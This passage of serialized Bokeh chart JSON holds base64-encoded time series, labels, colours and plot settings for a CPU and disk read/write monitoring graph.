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\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[360]},\"Type\":[\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\",\"Disk Write\"],\"color\":[\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\",\"#FDE724\"],\"index\":[720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799,800,801,802,803,804,805,806,807,808,809,810,811,812,813,814,815,816,817,818,819,820,821,822,823,824,825,826,827,828,829,830,831,832,833,834,835,836,837,838,839,840,841,842,843,844,845,846,847,848,849,850,851,852,853,854,855,856,857,858,859,860,861,862,863,864,865,866,867,868,869,870,871,872,873,874,875,876,877,878,879,880,881,882,883,884,885,886,887,888,889,890,891,892,893,894,895,896,897,898,899,900,901,902,903,904,905,906,907,908,909,910,911,912,913,914,915,916,917,918,919,920,921,922,923,924,925,926,927,928,929,930,931,932,933,934,935,936,937,938,939,940,941,942,943,944,945,946,947,948,949,950,951,952,953,954,955,956,957,958,959,960,961,962,963,964,965,966,967,968,969,970,971,972,973,974,975,976,977,978,979,980,981,982,983,984,985,986,987,988,989,990,991,992,993,994,995,996,997,998,999,1000,1001,1002,1003,1004,1005,1006,1007,1008,1009,1010,1011,1012,1013,1014,1015,1016,1017,1018,1019,1020,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079],\"y_index\":[2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2]},\"selected\":{\"id\":\"5073\"},\"selection_policy\":{\"id\":\"5072\"}},\"id\":\"5057\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"max_interval\":43200000.0,\"min_interval\":3600000.0,\"num_minor_ticks\":0},\"id\":\"5017\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"line_alpha\":0.1,\"line_color\":\"#208F8C\",\"line_width\":2,\"x\":{\"field\":\"Time\"},\"y\":{\"field\":\"Data\"}},\"id\":\"5032\",\"type\":\"Line\"},{\"attributes\":{\"active_drag\":\"auto\",\"active_inspect\":\"auto\",\"active_multi\":null,\"active_scroll\":\"auto\",\"active_tap\":\"auto\",\"tools\":[{\"id\":\"4967\"},{\"id\":\"4987\"},{\"id\":\"4988\"},{\"id\":\"4989\"},{\"id\":\"4990\"},{\"id\":\"4991\"}]},\"id\":\"4993\",\"type\":\"Toolbar\"},{\"attributes\":{},\"id\":\"5014\",\"type\":\"Selection\"},{\"attributes\":{\"axis\":{\"id\":\"4983\"},\"dimension\":1,\"grid_line_alpha\":0.3,\"grid_line_color\":\"navy\",\"minor_grid_line_alpha\":0.1,\"minor_grid_line_color\":\"navy\",\"ticker\":null},\"id\":\"4986\",\"type\":\"Grid\"},{\"attributes\":{},\"id\":\"5013\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"axis_label\":\"Data\",\"formatter\":{\"id\":\"5009\"},\"ticker\":{\"id\":\"4984\"}},\"id\":\"4983\",\"type\":\"LinearAxis\"},{\"attributes\":{\"overlay\":{\"id\":\"4992\"}},\"id\":\"4988\",\"type\":\"BoxZoomTool\"},{\"attributes\":{},\"id\":\"4990\",\"type\":\"SaveTool\"},{\"attributes\":{\"data_source\":{\"id\":\"5057\"},\"glyph\":{\"id\":\"5059\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"5060\"},\"selection_glyph\":null,\"view\":{\"id\":\"5062\"}},\"id\":\"5061\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"mantissas\":[1,2,5],\"max_interval\":500.0,\"num_minor_ticks\":0},\"id\":\"5015\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"data_source\":{\"id\":\"5029\"},\"glyph\":{\"id\":\"5031\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"5032\"},\"selection_glyph\":null,\"view\":{\"id\":\"5034\"}},\"id\":\"5033\",\"type\":\"GlyphRenderer\"},{\"attributes\":{},\"id\":\"5073\",\"type\":\"Selection\"},{\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]},\"id\":\"5018\",\"type\":\"DaysTicker\"},{\"attributes\":{\"label\":{\"value\":\"Disk Write\"},\"renderers\":[{\"id\":\"5061\"}]},\"id\":\"5086\",\"type\":\"LegendItem\"},{\"attributes\":{\"label\":{\"value\":\"% CPU\"},\"renderers\":[{\"id\":\"5006\"}]},\"id\":\"5028\",\"type\":\"LegendItem\"},{\"attributes\":{\"days\":[\"%m-%d %H:%M\"],\"hours\":[\"%H:%M:%S\"],\"milliseconds\":[\"%H:%M:%S.%3N\"],\"minutes\":[\"%H:%M:%S\"],\"seconds\":[\"%H:%M:%S\"]},\"id\":\"5000\",\"type\":\"DatetimeTickFormatter\"},{\"attributes\":{\"line_alpha\":0.1,\"line_color\":\"#FDE724\",\"line_width\":2,\"x\":{\"field\":\"Time\"},\"y\":{\"field\":\"Data\"}},\"id\":\"5060\",\"type\":\"Line\"},{\"attributes\":{\"days\":[1,8,15,22]},\"id\":\"5020\",\"type\":\"DaysTicker\"},{\"attributes\":{\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"max_interval\":1800000.0,\"min_interval\":1000.0,\"num_minor_ticks\":0},\"id\":\"5016\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"label\":{\"value\":\"Disk Read\"},\"renderers\":[{\"id\":\"5033\"}]},\"id\":\"5056\",\"type\":\"LegendItem\"},{\"attributes\":{\"dimensions\":\"width\"},\"id\":\"4987\",\"type\":\"WheelZoomTool\"},{\"attributes\":{},\"id\":\"5009\",\"type\":\"BasicTickFormatter\"},{\"attributes\":{\"source\":{\"id\":\"5057\"}},\"id\":\"5062\",\"type\":\"CDSView\"},{\"attributes\":{\"dimensions\":\"width\"},\"id\":\"4991\",\"type\":\"PanTool\"},{\"attributes\":{\"months\":[0,6]},\"id\":\"5025\",\"type\":\"MonthsTicker\"},{\"attributes\":{},\"id\":\"4973\",\"type\":\"DataRange1d\"},{\"attributes\":{\"data\":{\"Data\":{\"__ndarray__\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA